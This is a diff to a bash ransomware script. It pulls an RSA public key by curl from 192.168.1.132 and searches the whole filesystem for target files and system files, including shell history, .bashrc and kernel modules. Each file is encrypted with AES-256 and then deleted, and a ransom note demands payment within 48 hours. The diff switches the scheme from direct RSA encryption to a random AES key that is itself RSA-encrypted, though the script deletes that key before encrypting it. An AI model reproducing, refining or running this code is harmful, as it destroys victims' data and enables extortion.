@@ -61,14 +61,16 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
           "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )
 
 curl http://192.168.1.132:8080/pub.pem > /root/pub.pem 
-
 chmod 755 /root/pub.pem
+
+cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > /root/key.bin 
+chmod 755 /root/key.bin
 
 for ((num=0; num<"${#fileExts[@]}"; num++))
 do
   for file in $(find / -name "${fileExts[${num}]}")
   do 
-    openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in "${file}" -out "${file}.owned"
+    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
 
     rm -rf  ${file} &>/dev/null
   done
@@ -78,7 +80,7 @@ for ((num=0; num<"${#fileList[@]}"; num++))
 do
   for file in "${fileList[${num}]}"
   do
-    openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in "${file}" -out "${file}.owned"    
+    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
 
     rm -rf ${file} &>/dev/null
   done
@@ -114,3 +116,7 @@ fi
 /bin/rm -rf  /root/key.bin &>/dev/null
 
 echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
+
+# Encrypt key.bin with our public key
+openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root/key.bin.enc
+rm -rf /root/key.bin
